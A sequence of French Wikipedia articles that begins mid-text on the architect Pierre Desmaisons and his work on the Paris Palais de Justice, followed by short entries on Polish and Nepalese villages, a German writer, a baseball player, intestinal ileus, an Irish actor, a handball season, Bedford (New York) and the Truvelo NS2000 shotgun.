et l'Académie d'architecture finit par faire machine arrière. Il terminera le chantier aidé d'abord par Jacques Gondouin, nommé en 1782 pour le seconder, puis par Denis Antoine à partir de 1783. Alors que le chantier n'est pas achevé, la rentrée du Parlement a lieu cette même année. Deux œuvres de Pierre-Antoine Demachy montrent que la démolition de l'ancienne enceinte du palais royal est encore en cours à l'époque, un tableau en mains privées, et un dessin au Musée des beaux-arts du Canada. Ce dernier est particulièrement intéressant parce qu'il montre une rare vue en gros plan de la porte de l'ancien palais royal, qui coexiste encore pour un temps avec les nouvelles constructions.
Au total, la contribution de Pierre Desmaisons sera considérable : reprise et consolidation de la galerie Mercière (notamment les soubassements), agencements intérieurs, ajout de deux étages et d'un porche soutenu par une colonnade en façade (qui contrebalance la poussée des voûtes) là où Couture ne prévoyait que des pilastres, conception du fronton qui recevra un groupe sculpté par Pajou et quatre statues de Berruer et Lecomte, ailes symétriques en retour dans la cour du Mai, dessin de la grille majestueuse qui ferme la cour choisie de préférence à un portail opaque, réalisée par le serrurier Bigonnet et posée en 1787. Du côté de la Conciergerie, on lui doit le maintien de la silhouette familière du Palais quai de l'Horloge, alors que Couture prévoyait de raser les quatre tours emblématiques pour harmoniser cette façade, ce qui lui aurait fait perdre tout son caractère. On lui doit encore la reconstruction de l'oratoire détruit dans l'incendie, qu'il remplace par une chapelle dite depuis chapelle des Girondins. 
Le chantier du Palais de Justice entraîne un remodelage du quartier. En effet, auparavant la rue de la Barillerie qui va du pont au Change au pont Saint-Michel avait une forme courbe et était bordée des deux côtés par de petites maisons. Celles-ci ont été détruites en même temps que l'enceinte du Moyen Âge du Palais pour créer la nouvelle cour du Mai et sa grille. Un arrêt du conseil du roi du 25 septembre 1784 a imposé le redressement de la partie sud de la rue de la Barillerie jusqu'à la rue Saint-Louis (quai des Orfèvres) selon le plan fourni par Desmaisons et Antoine, qui étaient en outre chargés de construire deux grands bâtiments le long de la rue depuis la cour du Mai. La largeur de la rue avait été fixée à 36 pieds. Ce n'est qu'à la fin du qu'elle prendra sa largeur définitive et deviendra le boulevard du Palais.
Le remodelage se poursuit trois ans plus tard, avec un arrêt du conseil du roi du 3 juin 1787 qui approuve les plans de Desmaisons relatifs à la mise en valeur du Palais de Justice : il s'agit de créer une place en demi-cercle devant la cour du Mai, d'où partira vers l'est une rue de 42 pieds de large qui se substituera à la rue de la Vieille-Draperie et entraînera là encore d'importantes démolitions. Les travaux n'ont été effectués qu'en partie avant la Révolution et repris sous la Monarchie de Juillet. La rue ainsi créée a disparu depuis ; elle était à peu de distance de la rue de Lutèce et parallèle à elle. C'est en tout cas une preuve, parmi d'autres, que le redressement de la voirie parisienne avait commencé bien avant Haussmann.
Il nous en donne un autre exemple avec son intervention, à la même époque, sur le chantier de la colonnade du Louvre. C'est encore un cas de palais royal du Moyen Âge autour duquel se sont blotties des constructions anarchiques venues chercher la protection de ses murailles ou des opportunités commerciales. Les abords de la colonnade sont restés encombrés de bâtiments de service, d'anciens hôtels ou d'échoppes diverses. Louis XV et le marquis de Marigny ont décidé d'y mettre de l'ordre en 1755 et choisi pour dresser les plans de cette opération qui devait durer plus de trente ans deux architectes de renom : Gabriel et Soufflot. Le premier est mort en 1782 et le second en 1780. Il fallait leur trouver un successeur. C'est Desmaisons qui a été choisi, avec pour mission de réaliser la voirie entre la colonnade et Saint-Germain-l'Auxerrois.
Il est aussi architecte des prisons. Il a travaillé à la prison de l'Abbaye et à la prison Sainte-Pélagie. En 1786-1791, il a construit la prison de la Petite-Force, rue Pavée, détruite en 1853, mais dont il subsiste des vestiges (bossages) à l'angle des rues Pavée et Malher. Le roi voulait améliorer les conditions de salubrité des prisons parisiennes et la Petite-Force était réservée aux femmes. Il a aussi travaillé sur un projet de démolition de celle du Grand Châtelet pour la remplacer par une place en l'honneur de Louis XVI, largement ouverte sur la Seine et remodelant le débouché nord du pont au Change, après l'avoir fait pour son débouché sud. Les esprits sont mûrs pour un tel projet : dans les années 1780, on a détruit le Petit Châtelet au sud de la Cité et les maisons qui encombraient le pont au Change. L'idée sera reprise après la Révolution avec la démolition en 1802 du Grand Châtelet, suivie de la création d'une première place du Châtelet sous l'Empire, agrandie et dotée des deux théâtres que l'on connaît sous le second Empire.
En tant que noble et architecte du roi, Desmaisons s'est caché sous la Terreur, sans doute à Palaiseau, où a aussi vécu son fils Charles Pierre et où étaient installés leurs amis Debonnaire de Gif. Il a ainsi évité la guillotine, contrairement à André-Charles Debonnaire. De retour à Paris, il est mort à son domicile du 23 rue de Verneuil en janvier 1795. À quelques numéros de là, dans le vaste hôtel d'Aiguillon, il avait organisé avant la Révolution une présentation de plans d'architecte que visitaient les amateurs, ce qui laisse supposer qu'il avait là les bureaux de son agence. On peut comprendre que Desmaisons ait pris cette initiative d'exposition, car il avait été très impliqué dans le remodelage du quartier du Palais de Justice. Il tenait compte ainsi de l'opinion et de l'information du public, une attitude en vérité très moderne.
Parentèle.
Après un premier mariage dans le milieu bien situé de la construction, Pierre Desmaisons s'était remarié en 1766 avec Marie Geneviève David, décédée en 1786, que les lacunes de l'état-civil parisien ne permettent pas de rattacher à la lignée d'architectes de ce nom connus au siècle à Paris, commençant à Charles David, architecte de Saint-Eustache. Elles ne permettent pas plus de la rattacher à la famille du grand peintre. Et pourtant, c'est une question que l'on peut se poser quand on sait que le frère de Pierre Desmaisons, Jacques, lui aussi architecte, était le propre oncle du peintre, ayant épousé Marguerite Julie Buron, sœur de sa mère. Jacques Desmaisons et son beau-frère François Buron (encore un architecte), devenus en quelque sorte les parrains de Jacques-Louis David, s'étaient mis en tête de le faire entrer dans cette profession au vu de ses talents de dessinateur ! Le portrait de Jacques Desmaisons par son neveu est maintenant dans un musée américain, le Buffalo AKG Art Museum. Problème : Michel Gallet rapporte dans son dictionnaire que Louis Hautecœur n'est pas d'accord avec cette attribution ; il voit plutôt dans ce portrait celui de Pierre Desmaisons : "L'attitude autoritaire de l'artiste, accoudé sur le livre de Palladio, désigne notre académicien, parent plus lointain - mais plus flatteur - du jeune peintre. C'est d'ailleurs ce qu'ont cru les visiteurs et les critiques du Salon, puisque l'un d'eux écrit : "l'architecte qui a fait l'escalier de l'archevêché". Au demeurant, l'effigie énergique et quelque peu arrogante répond bien au souvenir que Desmaisons a laissé dans Paris". En tout état de cause, le portrait au pastel de Pierre Desmaisons beaucoup plus jeune existe dans la descendance, signé de Louis Vigée.
Pierre a eu un fils avec Marie Geneviève David : Charles Pierre, né en 1768, successivement conseiller au Châtelet, membre de la municipalité de Paris en 1807, puis sous la Restauration, il affiche ses sentiments royalistes : il est fait chevalier de la Légion d'honneur par Louis XVIII en juillet 1814 alors qu'il est adjoint au maire du arrondissement et devient héraut d'armes de l'ordre du Saint-Esprit entre 1819 et 1827 ; à la même époque, son neveu Nicolas Tiolier en était l'huissier. On les voit tous deux représentés (bâton à la hanche pour l'un, masse à l'épaule pour l'autre) sur le tableau de Nicolas Gosse acquis pour le Palais du Tau. Charles Pierre vivait au 81 rue de Lille et y est mort en 1843.
Quelques élèves.
Le plus connu est Jean-Louis Desprez (1743-1804), qui a commencé sa carrière en France avec une triple spécialisation dans le dessin d'architecture, la gravure et la décoration. Il assiste Pierre Desmaisons dans ses travaux pour l'archevêque de Paris. Il manifeste alors un certain goût pour le fantastique. Pensionnaire à l'académie de France à Rome en 1776, il fait la connaissance de l'abbé de Saint-Non qui l'embauche pour illustrer son célèbre "Voyage pittoresque" en cinq volumes. Encore en Italie, il est recruté par Gustave III de Suède et fait le reste de sa carrière dans ce pays où on lui doit de nombreux monuments. 
Avec son ami Pierre Panseron (1742-1803), lui aussi architecte et graveur de talent, ils ont publié plusieurs recueils de gravures. Il est à noter que Panseron, qui fut professeur de dessin à l'École militaire, s'est beaucoup intéressé à l'axe majeur, voulant le prolonger vers l'est, ce que Desmaisons s'est refusé à faire quand il a été chargé du dossier, car cela impliquait la démolition de Saint-Germain-l'Auxerrois.
Michel Gallet cite aussi parmi les élèves de Pierre Desmaisons Célestin Happe (1754-1832). On peut encore admirer boulevard de Sébastopol un immeuble qui appartenait à sa "Cour batave", partiellement détruite lors du percement du boulevard. Il est également, en tant qu'architecte de la préfecture de police, l'auteur d'un projet de création, quai des Grands-Augustins, d'un marché à la volaille, dit marché de la Vallée, dont la première pierre a été posée en 1809. Il a été détruit lors de la création des halles centrales.
On mentionnera encore Thomas Froideau (1757-1824) cité dans les registres de l'Académie d'architecture, qui nous intéresse en tant qu'auteur d'un dessin représentant la démolition du Palais de Justice en 1777, et gravé depuis (Bibliothèque Sainte-Geneviève). Ce dessin est important car il nous montre le petit bâtiment du Trésor des Chartes accolé à la Sainte-Chapelle, qui sera détruit par Desmaisons pour édifier les ailes symétriques de la cour du Mai. A droite, le dernier arbre de mai, une coutume depuis disparue.

</doc>
<doc id="7903280" url="https://fr.wikipedia.org/wiki?curid=7903280" title="Bromierzyk">
Bromierzyk



</doc>
<doc id="7903281" url="https://fr.wikipedia.org/wiki?curid=7903281" title="Ramghat">
Ramghat

Ramghat (en ) est un comité de développement villageois du Népal situé dans le district de Surkhet. Au recensement de 2011, il comptait .

</doc>
<doc id="7903282" url="https://fr.wikipedia.org/wiki?curid=7903282" title="Martin Beradt">
Martin Beradt

Martin Beradt ( à Magdebourg en royaume de Prusse - à New York, aux États-Unis) est un écrivain et juriste allemand.
Biographie.
Martin Beradt naît dans une famille juive orthodoxe de Magdebourg. En 1906, il obtient un doctorat en droit et s'installe comme avocat à Berlin. Pendant la Première Guerre mondiale, il est mobilisé puis renvoyé à la vie civile en raison d'une maladie oculaire. Il écrit en 1916 un récit sur son expérience de soldat, "Schipper", publié trois ans plus tard par le S. Fischer Verlag. Il avait déjà publié, avant la guerre, un roman, "Go". En 1919, paraît "Die Verfolgten", un recueil de nouvelles. Dans les années 1920, son activité littéraire est réduite. Il se consacre avec succès à son métier, il est notamment l'avocat de l'Union des producteurs d'automobiles.
Après 1933, il subit les lois antisémites du régime nazi. Interdit d'exercer son métier d'avocat, il l'est aussi de publication. Pourtant, il ne s'exile qu'en 1939, avec son épouse Charlotte Beradt, à Londres, puis l'année suivante à New York, où il meurt en 1949, presque aveugle.
Œuvre.
Comme nombre d'exilés allemands, Beradt et son œuvre tombent dans l'oubli dans l'Allemagne d'après-guerre. Il est redécouvert par Karl Otten qui, à partir de 1957, republie des nouvelles qu'il considère comme typiquement expressionnistes. Otten fait aussi connaître un roman écrit par Beradt à la fin de sa vie, "Die Straße der kleinen Ewigkeiten", qui décrit l'ancien quartier juif orthodoxe de Berlin, un livre vu aujourd'hui comme un témoignage sur un monde disparu.

</doc>
<doc id="7903289" url="https://fr.wikipedia.org/wiki?curid=7903289" title="Budki Żelazowskie">
Budki Żelazowskie

Budki Żelazowskie [ˈbutki ʐɛlaˈzɔfskʲɛ] est un village polonais, situé dans la gmina de Kampinos, dans la Powiat de Varsovie-ouest et la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 9 kilomètres à l'ouest de Kampinos, 54 kilomètres à l'ouest d'Ożarów Mazowiecki et à 47 kilomètres à l'ouest de Varsovie.
Le village a une population de 28 habitants en 2000.

</doc>
<doc id="7903290" url="https://fr.wikipedia.org/wiki?curid=7903290" title="Division d'infanterie Hamburg">
Division d'infanterie Hamburg



</doc>
<doc id="7903291" url="https://fr.wikipedia.org/wiki?curid=7903291" title="Adrián Nieto">
Adrián Nieto

Adrián Nieto (né le à La Havane, Cuba) est un receveur des Marlins de Miami de la Ligue majeure de baseball.
Carrière.
Adrián Nieto voit le jour à Cuba mais grandit en Floride, aux États-Unis. Son arrière-grand-père est natif d'Espagne et son père possède la nationalité espagnole. Par conséquent, Nieto peut s'aligner avec l'équipe de baseball d'Espagne à la Classique mondiale de baseball 2013.
Nieto est un choix de cinquième ronde des Nationals de Washington au repêchage amateur de juin 2008 mais, toujours joueur de ligues mineures, il est obtenu par les White Sox de Chicago au repêchage de la règle 5 du . Au début de la saison 2011, Nieto est suspendu 50 matchs par les ligues mineures pour usage de stéroïdes anabolisants.
Adrián Nieto fait ses débuts dans le baseball majeur avec les White Sox le . Il réussit son premier coup sûr au plus haut niveau le 5 avril suivant, un double aux dépens du lanceur Bruce Chen, des Royals de Kansas City. En 48 matchs en 2014 pour Chicago, il frappe deux circuits et remet une moyenne au bâton de ,236.
Après une saison 2015 passée avec un club-école des White Sox, il signe un contrat avec les Marlins de Miami le .

</doc>
<doc id="7903292" url="https://fr.wikipedia.org/wiki?curid=7903292" title="Niccolò Rinaldi">
Niccolò Rinaldi

Niccolò Rinaldi (né le à Florence) est un homme politique italien, député européen depuis , avec l'appui de l'Italie des valeurs, dont il est le chef de délégation au Parlement européen. En 2014, il choisit Choix européen et n'est pas réélu.

</doc>
<doc id="7903293" url="https://fr.wikipedia.org/wiki?curid=7903293" title="Adrian Nieto">
Adrian Nieto



</doc>
<doc id="7903296" url="https://fr.wikipedia.org/wiki?curid=7903296" title="Grabnik (Varsovie-ouest)">
Grabnik (Varsovie-ouest)

Grabnik [ˈɡrabnik] est un village polonais, situé dans la gmina de Kampinos, dans la Powiat de Varsovie-ouest et la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ au nord-ouest de Kampinos, à l'ouest d'Ożarów Mazowiecki et à à l'ouest de Varsovie.
Le village a une population de en 2000.

</doc>
<doc id="7903300" url="https://fr.wikipedia.org/wiki?curid=7903300" title="Granica (Varsovie-ouest)">
Granica (Varsovie-ouest)

Granica [ɡraˈnit͡sa] est un village polonais, situé dans la gmina de Kampinos, dans la Powiat de Varsovie-ouest et la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 3 kilomètres au nord-ouest de Kampinos, 27 kilomètres à l'ouest d'Ożarów Mazowiecki et à 40 kilomètres à l'ouest de Varsovie.
Le village a une population de 25 habitants en 2000.

</doc>
<doc id="7903302" url="https://fr.wikipedia.org/wiki?curid=7903302" title="167e Volksgrenadier division">
167e Volksgrenadier division



</doc>
<doc id="7903306" url="https://fr.wikipedia.org/wiki?curid=7903306" title="Lagaam">
Lagaam

Lagaam (en ) est un comité de développement villageois du Népal situé dans le district de Surkhet. Au recensement de 2011, il comptait .

</doc>
<doc id="7903309" url="https://fr.wikipedia.org/wiki?curid=7903309" title="Józefów (Kampinos)">
Józefów (Kampinos)

Józefów [juˈzɛfuf] est un village polonais, situé dans la gmina de Kampinos, dans la Powiat de Varsovie-ouest et la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 3 kilomètres au nord-est de Kampinos, 24 kilomètres à l'ouest d'Ożarów Mazowiecki et à 37 kilomètres à l'ouest de Varsovie.
Le village a une population de 28 habitants en 2000.

</doc>
<doc id="7903311" url="https://fr.wikipedia.org/wiki?curid=7903311" title="Irish Film &amp; Television Awards">
Irish Film &amp; Television Awards



</doc>
<doc id="7903312" url="https://fr.wikipedia.org/wiki?curid=7903312" title="IFTA Award">
IFTA Award



</doc>
<doc id="7903313" url="https://fr.wikipedia.org/wiki?curid=7903313" title="Kampinos A">
Kampinos A

Kampinos A est un village polonais, situé dans la gmina de Kampinos, dans la Powiat de Varsovie-ouest et la voïvodie de Mazovie dans le centre-est de la Pologne.
Le village a une population de 320 habitants en 2005.

</doc>
<doc id="7903314" url="https://fr.wikipedia.org/wiki?curid=7903314" title="Kirsztajnów">
Kirsztajnów

Kirsztajnów [kirʂˈtai̯nuf] est un village polonais, situé dans la gmina de Kampinos, dans la Powiat de Varsovie-ouest et la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 10 kilomètres à l'ouest de Kampinos, 34 kilomètres à l'ouest d'Ożarów Mazowiecki et à 47 kilomètres à l'ouest de Varsovie.
Le village a une population de 21 habitants en 2000.

</doc>
<doc id="7903315" url="https://fr.wikipedia.org/wiki?curid=7903315" title="Komorów (Varsovie-ouest)">
Komorów (Varsovie-ouest)

Komorów [kɔˈmɔruf] est un village polonais, situé dans la gmina de Kampinos, dans la Powiat de Varsovie-ouest et la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 2 kilomètres à l'ouest de Kampinos, 26 kilomètres à l'ouest d'Ożarów Mazowiecki et à 40 kilomètres à l'ouest de Varsovie.
Le village a une population de 279 habitants en 2000.

</doc>
<doc id="7903318" url="https://fr.wikipedia.org/wiki?curid=7903318" title="Koszówka">
Koszówka

Koszówka [kɔˈʂufka] est un village polonais, situé dans la gmina de Kampinos, dans la Powiat de Varsovie-ouest et la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 2 kilomètres à l'est de Kampinos, 24 kilomètres à l'ouest d'Ożarów Mazowiecki et à 37 kilomètres à l'ouest de Varsovie.
Le village a une population de 27 habitants en 2000.

</doc>
<doc id="7903319" url="https://fr.wikipedia.org/wiki?curid=7903319" title="Iléus">
Iléus

L'iléus est une perturbation de la capacité propulsive normale de l'intestin. Elle peut être causée par un manque de péristaltisme ou par une obstruction mécanique. Le mot « iléus » vient du grec ancien "eileós" (εἰλεός, « obstruction intestinale »). Le terme « subileus » fait référence à une obstruction partielle.
Signes et symptômes.
Les symptômes de l'iléus comprennent, sans s'y limiter :
Cause.
La diminution de la capacité de propulsion peut être causée soit par une occlusion intestinale, soit par une atonie ou une paralysie intestinale. Cependant, des cas présentant des symptômes et des signes d'occlusion intestinale surviennent, mais en l'absence d'obstruction mécanique, principalement dans la pseudo-obstruction colique aiguë, le syndrome d'Ogilvie. En 2023, la FDA américaine a signalé l'iléus gastro-intestinal comme effet indésirable du médicament sémaglutide, avec une fréquence et une relation causale inconnues.
Une occlusion intestinale.
Une occlusion intestinale est généralement une obstruction mécanique du tractus gastro-intestinal.
Paralysie intestinale.
La paralysie de l'intestin est souvent appelée iléus paralytique, dans laquelle la paralysie intestinale n'a pas besoin d'être complète, mais elle doit être suffisante pour interdire le passage des aliments dans l'intestin et conduire à un blocage intestinal. L'iléus paralytique est un effet secondaire courant de certains types de chirurgie, communément appelé iléus post-chirurgical. Elle peut également résulter de certains médicaments et de diverses blessures et maladies, comme la pancréatite aiguë. L'iléus paralytique provoque de la constipation et des ballonnements. En écoutant l'abdomen avec un stéthoscope, aucun bruit intestinal n'est entendu car l'intestin est inactif.
Une paralysie temporaire d’une partie des intestins survient généralement après une chirurgie abdominale. Le contenu intestinal de cette portion étant incapable d'avancer, il convient d'éviter de manger ou de boire jusqu'à ce que le bruit péristaltique se fasse entendre, par auscultation (utilisation d'un stéthoscope) de la zone où se trouve cette portion. L'atonie ou la paralysie intestinale peut être causée par des réflexes neuronaux inhibiteurs, une inflammation ou une autre implication des peptides neurohumoraux.
Traitement.
Traditionnellement, rien par voie orale, mais une alimentation douce par sonde d'alimentation entérale peut aider à restaurer la motilité en déclenchant les signaux de rétroaction normaux de l'intestin. C'est donc la prise en charge recommandée au départ.
Lorsque le patient présente des signes sévères et persistants indiquant que la motilité est complètement perturbée, une aspiration nasogastrique et une nutrition parentérale peuvent être nécessaires jusqu'à ce que le passage soit rétabli. Dans de tels cas, la poursuite d’une alimentation entérale agressive entraîne un risque de perforation de l’intestin.
Plusieurs options s'offrent à vous en cas d'iléus paralytique. La plupart des traitements ont un effet de soutien transitoire. S'il est causé par un médicament, l'agent incriminé, il faut l'arrêter ou le réduire. Les selles peuvent être stimulées en prescrivant du lactulose, de l'érythromycine ou, dans les cas graves soupçonnés d'avoir une composante neurologique (comme le syndrome d'Ogilvie), de la néostigmine. Il existe également des preuves issues d'une revue systématique d'essais contrôlés randomisés selon lesquelles le chewing-gum, en tant que forme « d'alimentation fictive », peut stimuler la motilité gastro-intestinale pendant la période postopératoire et réduire la durée de l'iléus postopératoire.
Si possible, la cause sous-jacente est corrigée (par exemple, remplacer les électrolytes).
Chez les chevaux.
L'iléus est une cause de coliques chez les chevaux dues à une obstruction fonctionnelle des intestins. On l'observe le plus souvent chez les chevaux en postopératoire, en particulier après une chirurgie contre les coliques. Les chevaux souffrant d'iléus courent un risque de rupture gastrique en raison d'une accumulation rapide de reflux et nécessitent une prise en charge médicale intense avec une intubation nasogastrique fréquente. L'iléus peut augmenter la formation d'adhérences, car les segments intestinaux ont un contact plus prolongé et la distension intestinale provoque des lésions séreuses et une ischémie. Elle est généralement traitée avec un soutien liquidien agressif, des procinétiques et des anti-inflammatoires.
Terminologie.
Le codage CIM-10 reflète à la fois les sens de péristaltisme altéré et les sens d'obstruction mécanique du terme modifiés par divers adjectifs. Certains auteurs ont plaidé pour essayer de réserver le terme aux sens du péristaltisme altérés, en vertu de laquelle certains termes plus anciens tels que « iléus biliaire » et « iléus méconial », bien que maintenant techniquement des noms inappropriés, sont toujours acceptés comme corrects en raison de leur usage établi de longue date.

</doc>
<doc id="7903321" url="https://fr.wikipedia.org/wiki?curid=7903321" title="Latikoili">
Latikoili

Latikoili (en ) est un comité de développement villageois du Népal situé dans le district de Surkhet. Au recensement de 2011, il comptait .

</doc>
<doc id="7903323" url="https://fr.wikipedia.org/wiki?curid=7903323" title="Kwiatkówek (Mazovie)">
Kwiatkówek (Mazovie)

Kwiatkówek [kfjatˈkuvɛk] est un village polonais, situé dans la gmina de Kampinos, dans la Powiat de Varsovie-ouest et la voïvodie de Mazovie dans le centre-est de la Pologne.
Le village a une population de 43 habitants en 2000.

</doc>
<doc id="7903328" url="https://fr.wikipedia.org/wiki?curid=7903328" title="Kwiatkówek">
Kwiatkówek

Kwiatkówek peut faire référence à :
Toponymie.
en Pologne

</doc>
<doc id="7903329" url="https://fr.wikipedia.org/wiki?curid=7903329" title="Michael McElhatton">
Michael McElhatton

Michael McElhatton /mək elˈhætn/, né Michael Cecil Pringle le à Dublin est un acteur et scénariste irlandais d'origine américaine. Il est notamment connu pour interpréter le rôle de Roose Bolton dans la série télévisée "Game of Thrones".
Biographie.
Michael McElhatton est né en 1963 à Terenure, une banlieue au sud de Dublin. Il a commencé à étudier le théâtre au Terenure College, une école connue pour sa tradition dramatique et a ensuite passé huit ans à Londres où il diplômé de la Royal Academy of Dramatic Art en 1987. McElhatton est retourné en Irlande au début des années 90, où il a commencé sa carrière d'acteur principalement dans le théâtre et la télévision. Il est apparu dans un court métrage intitulé "The Loser" en 1990. En 1996, il a été dirigé par John Carney dans le film "November Afternoon", dans lequel il joue le personnage principal. À la fin des années 90 et au début des années 2000, McElhatton est apparu dans de nombreuses séries et téléfilms en Irlande, travaillant avec divers réalisateurs, dont Paddy Breathnach et Conor McPherson pour des rôles dans ""(1997), "Saltwater" (2000), "Coup de peigne" (2001) et "Les Acteurs" (2003). Entre 2000 et 2002, McElhatton est devenu célèbre en apparaissant dans les comédies de situation "Paths to Freedom" et "Fergus's Wedding". En plus d'agir, il a également pris le rôle de scénariste, en écrivant le scénario pour tous les épisodes. Le personnage de Rats dans "Paths to Freedom", qu'il a écrit et joué est devenu populaire auprès du public et lui a permis d'être adapté en un long métrage entier en 2003 ("Spin the Bottle"). Au fil de sa carrière, McElhatton a continué à jouer des personnages mineurs dans des films de réalisateurs tels que Lenny Abrahamson, John Boorman et Kari Skogland. McElhatton est également apparu dans "Perrier's Bounty" (2009) et "Death of a Superhero" (2011).
Il reprend son rôle d'écrivain en 2010, écrivant six épisodes de la sitcom "Your Bad Self". Au cours de la décennie suivante, McElhatton a commencé à apparaître dans des rôles beaucoup plus importants. En 2011, il a joué un rôle dans le film "Albert Nobbs" réalisé par Rodrigo García et l'année suivante dans le court métrage "Pentecost", qui a reçu une nomination pour le meilleur court métrage aux Oscars 2012. Cette même année, il participe au film"Shadow Dancer" réalisé par James Marsh tout en étant également à la télévision dans le casting de la mini-série "".
En 2012, McElhatton rejoint le casting de la célèbre série télévisée HBO "Game of Thrones", à partir de la deuxième saison, jouant le personnage de Roose Bolton. À partir de la cinquième saison, il a été promu régulier de la série. En 2015, il joue l'un des protagonistes du film d'horreur "Le Sanctuaire", présenté au Festival du film de Sundance 2015.
Il est apparu dans l'adaptation à l'écran de l'histoire vraie du drame de la Seconde Guerre mondiale `` The Zookeeper's Wife " en 2017.
Le 6 novembre 2019, il a été annoncé sur le compte Twitter d'Amazon que McElhatton jouerait Tam al'Thor dans la prochaine adaptation de La roue du temps.

</doc>
<doc id="7903330" url="https://fr.wikipedia.org/wiki?curid=7903330" title="Lekhgaun">
Lekhgaun

Lekhgaun peut faire référence à :

</doc>
<doc id="7903332" url="https://fr.wikipedia.org/wiki?curid=7903332" title="Fantasia quasi sonata">
Fantasia quasi sonata



</doc>
<doc id="7903333" url="https://fr.wikipedia.org/wiki?curid=7903333" title="Łazy (Varsovie-ouest)">
Łazy (Varsovie-ouest)

Łazy [ˈwazɨ] est un village polonais, situé dans la gmina de Kampinos, dans la Powiat de Varsovie-ouest et la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 4 kilomètres à l'ouest de Kampinos, 28 kilomètres à l'ouest d'Ożarów Mazowiecki et à 42 kilomètres à l'ouest de Varsovie.
Le village a une population de 256 habitants en 2000.

</doc>
<doc id="7903335" url="https://fr.wikipedia.org/wiki?curid=7903335" title="Dante Sonata">
Dante Sonata



</doc>
<doc id="7903336" url="https://fr.wikipedia.org/wiki?curid=7903336" title="Lekhgaun (Surkhet)">
Lekhgaun (Surkhet)

Lekhgaun (en ) est un comité de développement villageois du Népal situé dans le district de Surkhet. Au recensement de 2011, il comptait .

</doc>
<doc id="7903337" url="https://fr.wikipedia.org/wiki?curid=7903337" title="Championnat de France masculin de handball de Nationale 1 2012-2013">
Championnat de France masculin de handball de Nationale 1 2012-2013

La saison 2012-2013 du Championnat de France masculin de handball de Nationale 1 est la édition de la compétition, au national.
Le championnat est remporté par le Villeurbanne Handball Association, vainqueur en finale des Girondins de Bordeaux HBC. Toutefois, Villeurbanne n'est finalement pas autorisé à participer à la Division 2 et donc seul Bordeaux est promu.
Formule de la compétition.
La Nationale 1 regroupe 28 clubs répartis en deux poules de 14 clubs, selon la situation géographique et les classements obtenus précédemment. Dans chacune des deux poules, les clubs se rencontrent en matches aller et retour. Au terme de la saison, les deux clubs classés premiers dans chacune des poules sont promus en Division 2 et se disputent le titre de champion de France de Nationale 1 en matches aller et retour.
Les clubs classés onzièmes, douzièmes, treizièmes et quatorzièmes (soit les 4 derniers de chaque poule) sont relégués en Nationale 2.
Compétition.
Finale.
La finale s'est disputée les 2 et :
Le Villeurbanne Handball Association est champion de France.

</doc>
<doc id="7903341" url="https://fr.wikipedia.org/wiki?curid=7903341" title="Łazy Leśne">
Łazy Leśne

Łazy Leśne [ˈwazɨ ˈlɛɕnɛ] est un village polonais, situé dans la gmina de Kampinos, dans la Powiat de Varsovie-ouest et la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 4 kilomètres au nord-ouest de Kampinos, 28 kilomètres à l'ouest d'Ożarów Mazowiecki et à 41 kilomètres à l'ouest de Varsovie.
Le village a une population de 18 habitants en 2000.

</doc>
<doc id="7903345" url="https://fr.wikipedia.org/wiki?curid=7903345" title="Pasikonie">
Pasikonie

Pasikonie [paɕiˈkɔɲe] est un village polonais, situé dans la gmina de Kampinos, dans la Powiat de Varsovie-ouest et la voïvodie de Mazovie dans le centre-est de la Pologne.
Le village a une population de 60 habitants en 2000.

</doc>
<doc id="7903346" url="https://fr.wikipedia.org/wiki?curid=7903346" title="Bedford (New York)">
Bedford (New York)

Bedford est une ville "(town)" du comté de Westchester dans l’État de New York aux États-Unis. Sa population était de habitants lors du recensement de 2010.
Histoire.
La ville de Bedford est fondée le . 22 personnes de Stamford au Connecticut, achètent un terrain pour y fonder une communauté. Bedford a fait une partie du Connecticut en 1697. Le roi Guillaume III d'Angleterre a émis un décret royal en 1700 déplaçant la commune à l'état de New York.
La ville a servi de siège de comté du comté de Westchester pendant la guerre d'indépendance américaine après la bataille de White Plains. Bedford est brûlé par les Britanniques en juillet de 1779. Après l'indépendance, Bedford devient l'un des deux sièges du gouvernement du comté jusqu'en 1870. Le plus ancien bâtiment du gouvernement du comté de Westchester est le tribunal dans le village de Bedford, il a été construit en 1787 et rénové dans les années 1960.

</doc>
<doc id="7903349" url="https://fr.wikipedia.org/wiki?curid=7903349" title="Pindal">
Pindal

Pindal [ˈpindal] est un village polonais, situé dans la gmina de Kampinos, dans la Powiat de Varsovie-ouest et la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 7 kilomètres à l'ouest de Kampinos, 31 kilomètres à l'ouest d'Ożarów Mazowiecki et à 45 kilomètres à l'ouest de Varsovie.
Le village a une population de 21 habitants en 2000.

</doc>
<doc id="7903352" url="https://fr.wikipedia.org/wiki?curid=7903352" title="Liste de jeux Tengen">
Liste de jeux Tengen

La liste de jeux Tengen répertorie les jeux vidéo publiés par "Tengen" de 1987 à 1994.

</doc>
<doc id="7903357" url="https://fr.wikipedia.org/wiki?curid=7903357" title="Pindal (homonymie)">
Pindal (homonymie)



</doc>
<doc id="7903364" url="https://fr.wikipedia.org/wiki?curid=7903364" title="Truvelo Neostead NS2000">
Truvelo Neostead NS2000

Le NeoStead 2000 (NS2000) est un fusil de combat développé par l'armurerie sud-africaine Truvelo. Le NS2000 a été utilisé à titre d'essai pendant quelques années par des forces spéciales comme le SAS. La production de ce fusil a commencé en 2001 pour une commercialisation en octobre de la même année. Cette arme se distingue notamment par son mouvement de pompe inversé et son double magasin tubulaire situé au-dessus du canon.
Design et production.
Le NS2000 est un fusil à pompe de calibre 12 pesant un peu moins de 4 kg, essentiellement conçu pour les applications de sécurité et anti-émeutes.
En vertu de sa configuration "bullpup", l'arme présente un canon de 572 mm pour une longueur totale de seulement 686 mm. Ses petites dimensions lui permettent d'être plus manœuvrable dans les espaces clos tout en conservant un canon de bonne longueur qui lui permet de rester précis à plus longue distance.
